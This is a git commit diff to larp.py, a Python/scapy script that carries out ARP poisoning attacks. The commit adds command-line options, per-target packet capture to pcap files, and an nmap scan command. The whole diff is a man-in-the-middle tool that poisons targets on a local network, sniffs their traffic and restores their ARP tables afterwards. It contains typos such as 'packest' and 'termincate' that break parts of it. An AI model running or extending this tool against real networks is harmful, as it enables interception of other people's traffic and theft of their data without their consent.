9dadf29db36ca93a9a94688f0a399ad39e8f4311
Leo Smith <p4p1@users.noreply.github.com>
2017-04-24 18:57:27 +0200

    :lemon:

--- larp.py
+++ larp.py
@@ -10,18 +10,30 @@
 # and setup a shell so that when you send an id it stops certain arps
 import sys
 import multiprocessing
+import subprocess
+import getopt
 
 from scapy.all import *
 from termcolor import colored
 
 def usage():
     print "%s is a script that performs an arp poisonning attack" % sys.argv[0]
-    print "for this script to work you need a file with different ip address's"
-    print "that are on the network the file has to be named t_ip.txt by default"
-    print "and located in the /tmp/ directory so: /tmp/t_ip.txt"
     print
     print "Usage:"
-    print "\t%s [gateway_ip] [interface]    => performs and arp poisonning attack" % sys.argv[0]
+    print "\t%s -h    => show this message" % sys.argv[0]
+    print "\t%s -a [subnet_mask]  => automate the program" % sys.argv[0]
+    print "\t%s -i --interface => provide the interface to use" % sys.argv[0]
+    print "\t%s -g --gateway => provide the gateway to arp to" % sys.argv[0]
+    print "\t%s -f --file   => provide the file of all of the target" % sys.argv[0]
+    print "Example:"
+    print "\t%s -i wlan0 -g 192.168.1.1 -t target_ip_list.txt" % sys.argv[0]
+    print "\t%s -i wlan0 -g 192.168.1.1" % sys.argv[0]
+    print "\t[!] The above one will look for /tmp/t_ip.txt for the targets list"
+    print
+    print "\t%s" % sys.argv[0]
+    print "\t[!] The above one will implicitly think that you are using wlp2s0"
+    print "\t[!] for the interface and 192.168.1.1 for the gateway and using"
+    print "\t[!] /tmp/t_ip.txt"
 
 #------ BHP code ------
 
@@ -95,10 +107,11 @@ class larp():
 
     def sniffer(self, target_ip):
         bpf_filter = "ip host %s" % target_ip
+        os.mkdir("/tmp/larp_%s" % target_ip)
         f_i = 0
         while True:
-            packets = sniff(filter=bpf_filter, iface=self.interface, count=100)
-            wrpcap('/tmp/larp_sniffer_%s_%d.cap' % (target_ip, f_i), packest)
+            packets = sniff(filter=bpf_filter, iface=self.interface, count=1)
+            wrpcap('/tmp/larp_%s/larp_sniffer_%s_%d.cap' % (target_ip, target_ip, f_i), packest)
             f_i += 1
 
     def main(self):
@@ -115,49 +128,77 @@ class larp():
         print colored("[*] Main menu:\n[*] Number of client's: %d" % t_id, "green")
         while len(id_map):
             buf = raw_input('#>')
-            #try:
-            if "all" in buf or "a" == buf:
-                for i in xrange(0, t_id):
-                    self.thread_array[i].terminate()
-                    restore_target(self.g_ip, self.g_mac, id_map[i][0], id_map[i][1])
-                    print colored("[^] Restored: %s" % id_map[i][0], "blue")
-                    if id_map[i][2] is not None:
-                        id_map[i][2].terminate()
-                        print colored("[^] Stoped sniffer for %s" % id_map[i][0], "blue")
-                    del id_map[i]
-            elif "list" in buf or "l" == buf:
-                for i in xrange(0, t_id):
-                    print colored("[^] %d => %s / %s" % (i, id_map[i][0], id_map[i][1]), "blue")
-            elif "sniff" in buf or "s" == buf.split(' ')[0]:
-                i = int(buf.split(' ')[1])
-                print colored("[^] Sniffig %d => %s" % (int(buf.split(' ')[1]),id_map[i][0]), "blue")
-                id_map[i][2] = multiprocessing.Process( target=self.sniffer,\
-                args=(id_map[i][0],))
-                id_map[i][2].start()
-            else:
-                self.thread_array[int(buf)].terminate()
-                restore_target(self.g_ip, self.g_mac, id_map[int(buf)][0], id_map[int(buf)][1])
-                print colored("[^] Restored: %s" % id_map[int(buf)][0], "blue")
-                if id_map[int(buf)][2] != None:
-                    id_map[int(buf)][2].termincate()
-                    print colored("[^] Stoped sniffer for %s" % id_map[int(buf)][0], "blue")
-                del id_map[int(buf)]
-            #except:
-                #print colored("[!] Available commands: all - list - sniff", "red")
+            try:
+                if "all" in buf or "a" == buf:
+                    for i in xrange(0, t_id):
+                        self.thread_array[i].terminate()
+                        restore_target(self.g_ip, self.g_mac, id_map[i][0], id_map[i][1])
+                        print colored("[^] Restored: %s" % id_map[i][0], "blue")
+                        if id_map[i][2] is not None:
+                            id_map[i][2].terminate()
+                            print colored("[^] Stoped sniffer for %s" % id_map[i][0], "blue")
+                        del id_map[i]
+                elif "list" in buf or "l" == buf:
+                    for i in xrange(0, t_id):
+                        print colored("[^] %d => %s / %s" % (i, id_map[i][0], id_map[i][1]), "blue")
+                elif "sniff" in buf or "s" == buf.split(' ')[0]:
+                    i = int(buf.split(' ')[1])
+                    print colored("[^] Sniffig %d => %s" % (int(buf.split(' ')[1]),id_map[i][0]), "blue")
+                    print colored("[!] Sniffer packet stored in files 10 by 10 and it only sniffs for http", "red")
+                    id_map[i][2] = multiprocessing.Process( target=self.sniffer,\
+                    args=(id_map[i][0],))
+                    id_map[i][2].start()
+                elif "nmap" in buf or "n" == buf.split(' ')[0]:
+                    data = 1
+                    i = int(buf.split(' ')[1])
+                    print colored("[^] running nmap on %d => %s" % (i, id_map[i][0]), "blue")
+                    print colored("[*] Output:", "green")
+                    os.system("nmap %s" %id_map[i][0])
+                else:
+                    self.thread_array[int(buf)].terminate()
+                    restore_target(self.g_ip, self.g_mac, id_map[int(buf)][0], id_map[int(buf)][1])
+                    print colored("[^] Restored: %s" % id_map[int(buf)][0], "blue")
+                    if id_map[int(buf)][2] != None:
+                        id_map[int(buf)][2].termincate()
+                        print colored("[^] Stoped sniffer for %s" % id_map[int(buf)][0], "blue")
+                    del id_map[int(buf)]
+            except:
+                print colored("[!] Available commands: all - list - sniff", "red")
         for thread in self.thread_array:
             thread.join()
 
 if __name__ == "__main__":
+    interface = None
+    gateway = None
+    target_file = None
     try:
-        if len(sys.argv) == 3:
-            script, gateway_ip, interface = sys.argv
-        else:
-            script, gateway_ip = sys.argv
-            interface = "wlp2s0"
+        optlist, args = getopt.getopt(sys.argv[1:], "ha:ig:f:",\
+            ["help", "auto", "interface", "gateway", "file"])
     except:
-        print >> sys.stderr, colored("[!] YOU DID NOT PROVIDE THE GOOD NUMBER OF ARGUMENTS", 'red')
+        print >> sys.stderr, colored("[!] YOU DID NOT PROVIDE THE GOOD NUMBER OF ARGUMENTS:\n%s" % str(getopt.GetoptError), 'red')
         usage()
         sys.exit(-1)
-
-    ls = larp(gateway_ip, interface, "/tmp/t_ip.txt")
+    for o, a in optlist:
+        if o in ("-h", "--help"):
+            usage()
+            sys.exit(1)
+        elif o in ("-a", "--auto"):
+            pass #automode
+        elif o in ("-i", "--interface"):
+            interface = a
+        elif o in ("-g", "--gateway"):
+            gateway = a
+        elif o in ("-f", "--file"):
+            target_file = a
+        else:
+            assert False, "Umhandled Option"
+    #-----------------------------------------
+    if not interface:
+        interface = "wlp2s0"
+    if not gateway:
+        gateway = "192.168.1.1"
+    if not target_file:
+        target_file = "/tmp/t_ip.txt"
+    #----------------------------------------
+    ls = larp(gateway, interface, target_file)
     ls.main()
